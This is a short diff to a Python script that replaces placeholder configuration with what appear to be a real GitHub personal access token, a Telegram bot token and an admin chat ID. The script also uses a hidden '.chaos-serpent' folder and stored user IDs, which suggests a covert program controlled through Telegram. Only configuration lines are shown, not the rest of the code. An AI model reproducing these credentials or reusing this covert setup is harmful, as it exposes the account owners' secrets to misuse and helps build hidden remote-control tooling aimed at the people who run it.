@@ -169,9 +169,9 @@ install_missing_modules()
 # Configuration
 HIDDEN_DIR_NAME = ".chaos-serpent"
 HIDDEN_SUBDIR_NAME = "cache"
-GITHUB_TOKEN = "your_github_personal_access_token"  # Replace with your actual GitHub PAT
-TELEGRAM_TOKEN = "your_telegram_bot_token"          # Replace with your actual Telegram Bot Token
-ADMIN_CHAT_ID = "your_chat_id"                     # Replace with your actual Telegram Chat ID
+GITHUB_TOKEN = "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"  # Replace with your actual GitHub PAT
+TELEGRAM_TOKEN = "8364609882:AAFIZerZkAbcdYuRwzdxtjpPxgri_PWLc1M"          # Replace with your actual Telegram Bot Token
+ADMIN_CHAT_ID = "7926187033"                     # Replace with your actual Telegram Chat ID
 USER_ID_FILE = os.path.join(get_hidden_folder_path(), ".user_id")
 USER_ID_HASH_FILE = os.path.join(get_hidden_folder_path(), ".user_id_hash")
 CHECK_INTERVAL = 5
